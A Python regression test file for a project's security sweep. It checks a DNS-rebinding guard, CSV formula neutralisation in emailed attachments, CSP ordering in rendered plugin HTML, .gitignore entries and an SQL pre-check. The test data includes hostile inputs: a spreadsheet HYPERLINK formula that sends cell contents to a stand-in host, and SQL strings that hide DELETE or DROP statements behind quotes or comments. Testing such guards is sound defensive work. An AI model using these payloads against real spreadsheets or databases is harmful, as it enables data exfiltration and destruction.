"""Regression tests for the pre-release security sweep (review "sec").

1. core/advisory.get() re-checks the address it actually CONNECTED to (DNS rebinding between
   check_url() and connect), and still works through a configured proxy.
2. Gabriel's CSV attachments (email data / widget) neutralise spreadsheet formulas.
3. Argos renders captured plugin HTML with the CSP <meta> FIRST in the srcdoc (both renders), so
   a '<header>' / commented '<head>' in the page can't push the policy out of <head>.
4. .gitignore keeps the gate enable files and runtime state (C2 uploads, metric history) out.
5. (contract armed flag — owner's decision at publish time; not checked here.)

Run: python3 tests/test_review_sec.py   (exit 0 = pass)
"""
import glob
import json
import os
import socket
import sys
import tempfile
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
TMP = tempfile.mkdtemp(prefix="review_sec_")
os.environ.setdefault("NAVI_CACHE_DIR", os.path.join(TMP, "cache"))
os.environ.setdefault("NAVI_TAGLOG_DB", os.path.join(TMP, "t.db"))
os.environ["HOUNDS_CONFIG"] = "off"
for k in list(os.environ):
    if k.lower() in ("http_proxy", "https_proxy", "all_proxy", "no_proxy"):
        os.environ.pop(k)

FAILS = []


def check(ok, msg):
    print(("PASS " if ok else "FAIL ") + msg)
    if not ok:
        FAILS.append(msg)


# ---------------------------------------------------------------- 1. advisory rebinding guard
class _H(BaseHTTPRequestHandler):
    def do_GET(self):
        b = b"INTERNAL"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)

    def log_message(self, *a):
        pass


srv = HTTPServer(("127.0.0.1", 0), _H)
port = srv.server_address[1]
threading.Thread(target=srv.serve_forever, daemon=True).start()

from core import advisory  # noqa: E402

_real_gai = socket.getaddrinfo


def _fake_gai(host, *a, **k):
    if host == "rebind.example":            # what a TTL-0 DNS answer turns into at connect time
        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("127.0.0.1", port))]
    return _real_gai(host, *a, **k)


_real_check = advisory.check_url
socket.getaddrinfo = _fake_gai
advisory.check_url = lambda url: advisory.urllib.parse.urlsplit(url)   # "the check saw a public IP"
try:
    try:
        advisory.get("http://rebind.example:%d/" % port)
        check(False, "advisory.get refuses a connection that landed on 127.0.0.1 (DNS rebinding)")
    except advisory.Blocked as e:
        check("non-public" in str(e), "advisory.get refuses a connection that landed on 127.0.0.1 (DNS rebinding)")
    # through a proxy the TCP peer is the proxy, not the target: not refused by the peer check
    os.environ["http_proxy"] = "http://127.0.0.1:%d" % port
    try:
        body, _, _ = advisory.get("http://rebind.example/")
        check(body == "INTERNAL", "advisory.get still works through a configured HTTP proxy")
    except Exception as e:  # pragma: no cover
        check(False, "advisory.get still works through a configured HTTP proxy (%s)" % e)
    finally:
        os.environ.pop("http_proxy", None)
finally:
    socket.getaddrinfo = _real_gai
    advisory.check_url = _real_check
try:
    advisory.get("http://127.0.0.1/")
    check(False, "check_url still refuses a literal loopback URL")
except advisory.Blocked:
    check(True, "check_url still refuses a literal loopback URL")

# ---------------------------------------------------------------- 2. email CSV formula guard
os.environ["NAVI_ALLOW_WRITES"] = "1"
os.environ["NAVI_EMAIL"] = "1"
from core import navi_cli  # noqa: E402
import agents.email.api as gabriel  # noqa: E402

SEEN = {}


def _fake_mail(to, subject="", message="", file="", html="", agent="", sync=True):
    if file:
        if file.endswith(".zip"):
            import zipfile
            with zipfile.ZipFile(file) as z:
                SEEN[agent + ":" + subject] = "\n".join(z.read(n).decode("utf-8-sig", "replace")
                                                        for n in z.namelist() if n.endswith(".csv"))
        else:
            with open(file, encoding="utf-8-sig") as f:
                SEEN[agent + ":" + subject] = f.read()
    return {"ok": True, "message": "sent"}


navi_cli.mail = _fake_mail
evil = '=HYPERLINK("http://x.example/?"&A1,"click")'
rows = [{"host": evil if i == 0 else "h%d" % i, "n": i} for i in range(150)]
body, _ = gabriel.data({"confirm": True, "to": "a@b.example", "rows": rows, "columns": ["host", "n"],
                        "subject": "data"})
csv_text = SEEN.get("email:data", "")
check(body.get("mode") == "attachment" and csv_text, "email data(): 150 rows ride as a CSV attachment")
check("'" + evil.replace('"', '""') in csv_text or "'=HYPERLINK" in csv_text,
      "email data(): a formula cell is neutralised with a leading '")
rows2 = [{"host": "@SUM(1+1)" if i == 0 else "h%d" % i} for i in range(260)]
body, _ = gabriel.widget({"confirm": True, "to": "a@b.example", "rows": rows2, "columns": ["host"],
                          "subject": "widget"})
csv2 = SEEN.get("email:widget", "")
check(bool(csv2) and "'@SUM(1+1)" in csv2 and "\n@SUM" not in csv2,
      "email widget(): a formula cell in the long-list CSV is neutralised")

# ---------------------------------------------------------------- 3. argos sandbox CSP first
pg = open(os.path.join(ROOT, "agents", "argos", "page.html"), encoding="utf-8").read()
check("const doc=csp+String(p.html||'')" in pg,
      "argos webOpen(): the CSP <meta> is prepended before the captured markup")
i = pg.find("frame.srcdoc='<!doctype html>")
seg = pg[i:pg.find("o.output", i)] if i >= 0 else ""
check(i >= 0 and "Content-Security-Policy" in seg and "default-src \\'none\\'" in seg,
      "argos renderPluginOutput(): the srcdoc carries a default-src 'none' CSP before the plugin output")

# ---------------------------------------------------------------- 4. .gitignore
gi = {ln.strip() for ln in open(os.path.join(ROOT, ".gitignore"), encoding="utf-8")}
for n in (list(navi_cli._ENABLE_FILES) + list(navi_cli._EMAIL_ENABLE_FILES) + list(navi_cli._RCE_ENABLE_FILES)
          + ["data/c2_uploads/", "hounds.config.json*", ".env"]):
    check(n in gi, ".gitignore lists %s" % n)

# 5. (shipped contract armed:false) — left to the owner: contracts/navi-contract.json is the live
#    Contract on the owner's machine; disarm it at publish time rather than in the working tree.


# ---------------------------------------------------------------- 6. SQL pre-check lexing (merge)
from agents.explore.api import _safe_select as _ess        # noqa: E402
from agents.software import api as _swapi                   # noqa: E402
for q in ("""SELECT "'" FROM assets; DELETE FROM assets -- '""", "SELECT 1 /* ' */ ; DROP TABLE x",
          "SELECT 1 AS [x'] FROM assets; DELETE FROM assets -- '", "SELECT 1 AS `x'` FROM assets; DELETE FROM assets -- '"):
    check(_ess(q)[0] is None and _swapi._safe_select(q)[0] is None,
          "SQL pre-check: a quote in an identifier / comment can't hide a second statement: %r" % q[:40])
for q in ("SELECT * FROM vulns WHERE plugin_name LIKE '%update%'", "SELECT x FROM t WHERE y='it''s; fine'"):
    check(_ess(q)[0] is not None, "SQL pre-check: keywords / ';' inside a string literal are fine: %r" % q[:40])
check(_ess("SELECT 1 -- note")[0].endswith("\nLIMIT 500"), "SQL pre-check: LIMIT added on its own line (not inside a -- comment)")

srv.shutdown()
print("\n%d failure(s)" % len(FAILS))
sys.exit(1 if FAILS else 0)
